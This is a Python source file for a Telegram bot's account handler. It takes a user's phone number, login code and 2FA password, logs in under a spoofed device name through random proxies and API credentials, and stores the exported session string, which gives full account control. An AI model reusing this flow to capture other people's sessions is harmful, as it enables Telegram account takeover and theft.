import inspect
from typing import Union
from aiogram import types, Router
from aiogram.filters.callback_data import CallbackData
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import CallbackQuery, Message
import pyrogram.errors
from handlers.common.common import get_back_to_menu_button, send_message
from utils.custom_filters import IsUserExistFilter
from config import random_creds, random_proxy
from aiogram.filters import StateFilter
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from language import LanguageService
from services.user import UserService
from services.session import SessionService
from utils.phone_number import is_valid_phone_number
from utils.login_code import validate_login_code
from utils.proxy import parse_proxy_url
from utils.session import hide_session_string
from bot import bot
import traceback
import pyrogram
import logging
import asyncio

logger = logging.getLogger(__name__)

accounts_router = Router()

class AccountsCallback(CallbackData, prefix="accounts"):
  level: int
  session_id: int

class AccountsStates(StatesGroup):
  phone_number = State()
  login_code = State()
  password = State()

def create_callback_accounts(level: int, session_id: int = -1):
  return AccountsCallback(level=level, session_id=session_id).pack()

async def accounts(message: Union[Message, CallbackQuery] | None, chat_id: int | None = None, msg_id: int | None = None):
  if all([chat_id, msg_id]):
    telegram_id = chat_id
    language_code = await UserService.get_language_code(telegram_id)

    msg = LanguageService.get_translation(language_code, "accounts_description")
    markup = await get_accounts_markup(telegram_id, language_code)
    try:
      await bot.edit_message_text(msg, message_id=msg_id, chat_id=chat_id, reply_markup=markup)
    except Exception:
      await bot.send_message(chat_id, msg, reply_markup=markup)
    return
  elif message is None:
    return

  telegram_id = message.chat.id if isinstance(message, Message) else message.from_user.id
  language_code = await UserService.get_language_code(telegram_id)
  msg = LanguageService.get_translation(language_code, "accounts_description")
  markup = await get_accounts_markup(telegram_id, language_code)
  
  await send_message(message, msg, reply_markup=markup)

async def get_accounts_markup(telegram_id: int, language_code: str):
  keyboard_builder = InlineKeyboardBuilder()
  session_buttons = []

  user = await UserService.get_by_tgid(telegram_id)
  for session in user.sessions:
    session_buttons.append(types.InlineKeyboardButton(text=hide_session_string(session.session_string), callback_data=create_callback_accounts(2, session_id=session.id)))

  keyboard_builder.add(*session_buttons)
  if await UserService.new_session_available(telegram_id):
    add_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "add"), callback_data=create_callback_accounts(1))
    keyboard_builder.add(add_button, get_back_to_menu_button(language_code))
    adj = len(session_buttons) * [1] + [2]
    keyboard_builder.adjust(*adj)
  else:
    keyboard_builder.add(get_back_to_menu_button(language_code))
    adj = len(session_buttons) * [1] + [1]
    keyboard_builder.adjust(*adj)
  
  return keyboard_builder.as_markup()

async def add_session(callback: types.CallbackQuery | None, state: FSMContext, chat_id: int | None = None, msg_id: int | None = None, username: str | None = None):
  if all([chat_id, msg_id, username]):
    telegram_id = chat_id
    language_code = await UserService.get_language_code(telegram_id)

    add_session_msg = LanguageService.get_translation(language_code, "add_session")
    recipient_msg = LanguageService.get_translation(language_code, "recipient")
    add_session_description_msg = LanguageService.get_translation(language_code, "add_session_description")
    msg = (f"{add_session_msg}\n\n"
          f"{recipient_msg}: <code>{username}</code>\n\n"
          f"{add_session_description_msg}")

    back_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "back"), callback_data=create_callback_accounts(0))
    markup = types.InlineKeyboardMarkup(inline_keyboard=[[back_button]])
    try:
      await bot.edit_message_text(msg, message_id=msg_id, chat_id=chat_id, reply_markup=markup)
    except Exception:
      await bot.send_message(chat_id, msg, reply_markup=markup)
    await state.update_data(msg_id=msg_id)
    await state.set_state(AccountsStates.phone_number)
    return
  elif callback is None:
    return
  
  telegram_id = callback.from_user.id
  language_code = await UserService.get_language_code(telegram_id)

  add_session_msg = LanguageService.get_translation(language_code, "add_session")
  recipient_msg = LanguageService.get_translation(language_code, "recipient")
  add_session_description_msg = LanguageService.get_translation(language_code, "add_session_description")
  msg = (f"{add_session_msg}\n\n"
         f"{recipient_msg}: <code>{callback.from_user.username or callback.from_user.id}</code>\n\n"
         f"{add_session_description_msg}")

  back_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "back"), callback_data=create_callback_accounts(0))
  markup = types.InlineKeyboardMarkup(inline_keyboard=[[back_button]])
  await send_message(callback, msg, reply_markup=markup)
  await asyncio.gather(state.update_data(msg_id=callback.message.message_id), state.set_state(AccountsStates.phone_number))

@accounts_router.message(IsUserExistFilter(), StateFilter(AccountsStates.phone_number))
async def get_phone_number(message: types.Message, state: FSMContext):
  data = await state.get_data()
  await state.clear()
  msg_id = data.get("msg_id")
  chat_id = message.chat.id
  telegram_id = chat_id
  language_code = await UserService.get_language_code(telegram_id)

  phone_number = message.text or ""
  if not is_valid_phone_number(phone_number):
    await asyncio.gather(state.update_data(msg_id=msg_id), state.set_state(AccountsStates.phone_number), bot.delete_message(message.chat.id, message.message_id))
    return
  
  api_id, api_hash = random_creds()
  proxy = random_proxy()
  if proxy is not None:
    proxy = parse_proxy_url(proxy)
  app = pyrogram.Client(":memory:", device_model="Snoops Buy", client_platform=pyrogram.enums.ClientPlatform.ANDROID, app_version="Android 11.14.1", api_id=api_id, api_hash=api_hash, in_memory=True, proxy=proxy)
  await app.connect()
  try:
    sent = await app.send_code(phone_number)
  except Exception as e:
    tb_str = traceback.format_exc()
    logger.warning(f"[{telegram_id}] failed to login: {e} / {tb_str}")
    await asyncio.gather(state.update_data(msg_id=msg_id), state.set_state(AccountsStates.phone_number), bot.delete_message(message.chat.id, message.message_id), app.disconnect())
    return

  back_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "back"), callback_data=create_callback_accounts(1))
  markup = types.InlineKeyboardMarkup(inline_keyboard=[[back_button]])
  login_code_sent = LanguageService.get_translation(language_code, "login_code_sent")
  login_code_sent_service = LanguageService.get_translation(language_code, "login_code_sent_service")
  login_code_warning = LanguageService.get_translation(language_code, "login_code_warning")
  sent_code_descriptions = {
    pyrogram.enums.SentCodeType.APP: "Telegram app",
    pyrogram.enums.SentCodeType.SMS: "SMS",
    pyrogram.enums.SentCodeType.CALL: "phone call",
    pyrogram.enums.SentCodeType.FLASH_CALL: "phone flash call",
    pyrogram.enums.SentCodeType.FRAGMENT_SMS: "Fragment SMS",
    pyrogram.enums.SentCodeType.EMAIL_CODE: "email code"
  }
  msg = (f"{login_code_sent}: <code>{phone_number}</code>\n\n"
         f"{login_code_sent_service} <b>{sent_code_descriptions[sent.type]}</b>\n"
         f"{login_code_warning}")

  if msg_id is not None:
    try:
      await bot.edit_message_text(msg, message_id=msg_id, chat_id=chat_id, reply_markup=markup)
    except Exception:
      await bot.send_message(chat_id, msg, reply_markup=markup)
  else:
    await bot.send_message(chat_id, msg, reply_markup=markup)

  await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=sent.phone_code_hash), bot.delete_message(message.chat.id, message.message_id), state.set_state(AccountsStates.login_code))

@accounts_router.message(IsUserExistFilter(), StateFilter(AccountsStates.login_code))
async def get_login_code(message: types.Message, state: FSMContext):
  data = await state.get_data()
  await state.clear()
  msg_id = data.get("msg_id")
  app = data.get("app")
  phone_number = data.get("phone_number")
  phone_code_hash = data.get("phone_code_hash")
  chat_id = message.chat.id
  username = message.from_user.username or ""
  telegram_id = chat_id
  language_code = await UserService.get_language_code(telegram_id)
  if not all([msg_id, app, phone_number, phone_code_hash]):
    logger.warning(f"[{telegram_id}] invalid login code data: {data}")
    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.login_code), bot.delete_message(message.chat.id, message.message_id))
    return

  login_code = validate_login_code(message.text or "")

  try:
    await app.sign_in(phone_number, phone_code_hash, login_code)
  except pyrogram.errors.SessionPasswordNeeded:
    back_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "back"), callback_data=create_callback_accounts(1))
    markup = types.InlineKeyboardMarkup(inline_keyboard=[[back_button]])
    password_request = LanguageService.get_translation(language_code, "2fa_password")
    hint_txt = LanguageService.get_translation(language_code, "hint")
    try:
      hint = await app.get_password_hint()
    except:
      hint = None

    msg = f"{password_request}"
    if hint is not None:
      msg += f"\n\n{hint_txt} <span class=\"tg-spoiler\">{hint}</span>"

    if msg_id is not None:
      try:
        await bot.edit_message_text(msg, message_id=msg_id, chat_id=chat_id, reply_markup=markup)
      except Exception:
        await send_message(message, msg, reply_markup=markup)
    else:
      await send_message(message, msg, reply_markup=markup)

    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.password), bot.delete_message(message.chat.id, message.message_id))
    return
  except pyrogram.errors.PhoneCodeExpired:
    await asyncio.gather(bot.delete_message(message.chat.id, message.message_id), app.disconnect())
    return await add_session(None, state, chat_id=chat_id, msg_id=msg_id, username=username)
  except Exception as e:
    tb_str = traceback.format_exc()
    logger.warning(f"[{telegram_id}] failed to login: {e} / {tb_str}")
    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.login_code), bot.delete_message(message.chat.id, message.message_id))
    return
  
  s = await app.export_session_string()
  if await UserService.new_session_available(telegram_id):
    await UserService.add_session(telegram_id, app.api_id, app.api_hash, s)

  await asyncio.gather(bot.delete_message(message.chat.id, message.message_id), app.disconnect())
  await accounts(None, chat_id=chat_id, msg_id=msg_id)

@accounts_router.message(IsUserExistFilter(), StateFilter(AccountsStates.password))
async def get_password(message: types.Message, state: FSMContext):
  data = await state.get_data()
  await state.clear()
  msg_id = data.get("msg_id")
  app = data.get("app")
  phone_number = data.get("phone_number")
  phone_code_hash = data.get("phone_code_hash")
  chat_id = message.chat.id
  telegram_id = chat_id
  if not all([msg_id, app, phone_number, phone_code_hash]):
    logger.warning(f"[{telegram_id}] invalid password data: {data}")
    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.password), bot.delete_message(message.chat.id, message.message_id))
    return

  password = message.text or ""
  try:
    await app.check_password(password)
  except pyrogram.errors.PasswordHashInvalid:
    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.password), bot.delete_message(message.chat.id, message.message_id))
    return
  except Exception as e:
    tb_str = traceback.format_exc()
    logger.warning(f"[{telegram_id}] failed to login: {e} / {tb_str}")
    await asyncio.gather(state.update_data(msg_id=msg_id, app=app, phone_number=phone_number, phone_code_hash=phone_code_hash), state.set_state(AccountsStates.password), bot.delete_message(message.chat.id, message.message_id))
    return

  s = await app.export_session_string()
  if await UserService.new_session_available(telegram_id):
    await UserService.add_session(telegram_id, app.api_id, app.api_hash, s)

  await asyncio.gather(bot.delete_message(message.chat.id, message.message_id), app.disconnect())
  await accounts(None, chat_id=chat_id, msg_id=msg_id)

async def session_details(callback: types.CallbackQuery):
  telegram_id = callback.from_user.id
  language_code = await UserService.get_language_code(telegram_id)
  unpacked_callback = AccountsCallback.unpack(callback.data)

  session = await SessionService.get_by_id(unpacked_callback.session_id)
  if session is None:
    return
  proxy = random_proxy()
  if proxy is not None:
    proxy = parse_proxy_url(proxy)
  app = pyrogram.Client(":memory:", device_model="Snoops Buy", client_platform=pyrogram.enums.ClientPlatform.ANDROID, app_version="Android 11.14.1", session_string=session.session_string, api_id=session.api_id, api_hash=session.api_hash, in_memory=True, proxy=proxy)

  try:
    await app.connect()
  except pyrogram.errors.AuthKeyInvalid:
    await UserService.remove_session(telegram_id, session.id)
    return await accounts(callback)
  except pyrogram.errors.SessionExpired:
    await UserService.remove_session(telegram_id, session.id)
    return await accounts(callback)
  except Exception as e:
    tb_str = traceback.format_exc()
    logger.warning(f"[{telegram_id}] failed to connect using session: {e} / {tb_str}")
    return
  
  try:
    me, star_balance, active_sessions = await asyncio.gather(app.get_me(), app.get_stars_balance(), app.get_active_sessions())
    current_session = next((s for s in active_sessions.active_sessions if s.is_current), None)

    id = LanguageService.get_translation(language_code, "id")
    phone_number = LanguageService.get_translation(language_code, "phone_number")
    username = LanguageService.get_translation(language_code, "username")
    stars = LanguageService.get_translation(language_code, "stars")
    session_created_at = LanguageService.get_translation(language_code, "session_created_at")
    last_active = LanguageService.get_translation(language_code, "last_active")
    msg = (f"{id}: <code>{me.id}</code>\n"
          f"{phone_number}: <code>{me.phone_number}</code>\n"
          f"{username}: <b>{me.username}</b>\n"
          f"{stars}: {star_balance} ⭐\n\n")
    
    if current_session is not None:
      if current_session.last_active_date is not None:
        formatted_date = current_session.last_active_date.strftime("%d.%m.%Y %H:%M %p")
        msg += f"{last_active}: {formatted_date}\n"
      
      if current_session.log_in_date is not None:
        formatted_date = current_session.log_in_date.strftime("%d.%m.%Y %H:%M %p")
        msg += f"{session_created_at}: {formatted_date}\n"
    
    logout_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "logout"), callback_data=create_callback_accounts(3, session_id=session.id))
    back_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "back"), callback_data=create_callback_accounts(0))
    markup = types.InlineKeyboardMarkup(inline_keyboard=[[logout_button, back_button]])
    await send_message(callback, msg, reply_markup=markup)
  except pyrogram.errors.AuthKeyInvalid:
    await UserService.remove_session(telegram_id, session.id)
    return await accounts(callback)
  except pyrogram.errors.SessionExpired:
    await UserService.remove_session(telegram_id, session.id)
    return await accounts(callback)  
  except Exception as e:
    tb_str = traceback.format_exc()
    logger.warning(f"[{telegram_id}] failed to get session info: {e} / {tb_str}")
    return
  finally:
    await app.disconnect()

async def remove_session_confirmation(callback: types.CallbackQuery):
  telegram_id = callback.from_user.id
  language_code = await UserService.get_language_code(telegram_id)
  unpacked_callback = AccountsCallback.unpack(callback.data)

  session = await SessionService.get_by_id(unpacked_callback.session_id)
  if session is None:
    return
  
  logout_confirmation = LanguageService.get_translation(language_code, "logout_confirmation")
  msg = (f"{logout_confirmation} <b>{hide_session_string(session.session_string)}</b>")
  yes_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "yes"), callback_data=create_callback_accounts(4, session_id=session.id))
  no_button = types.InlineKeyboardButton(text=LanguageService.get_translation(language_code, "no"), callback_data=create_callback_accounts(0))
  markup = types.InlineKeyboardMarkup(inline_keyboard=[[yes_button, no_button]])
  await send_message(callback, msg, reply_markup=markup)

async def remove_session(callback: types.CallbackQuery):
  telegram_id = callback.from_user.id
  unpacked_callback = AccountsCallback.unpack(callback.data)

  session = await SessionService.get_by_id(unpacked_callback.session_id)
  if session is None:
    return
  
  await UserService.remove_session(telegram_id, session.id)
  return await accounts(callback)

@accounts_router.callback_query(AccountsCallback.filter(), IsUserExistFilter())
async def navigate(callback: CallbackQuery, state: FSMContext, callback_data: AccountsCallback):
  current_level = callback_data.level

  levels = {
    0: accounts,
    1: add_session,
    2: session_details,
    3: remove_session_confirmation,
    4: remove_session
  }

  current_level_function = levels[current_level]
  if inspect.getfullargspec(current_level_function).annotations.get("state") == FSMContext:
    await current_level_function(callback, state)
  else:
    await current_level_function(callback)
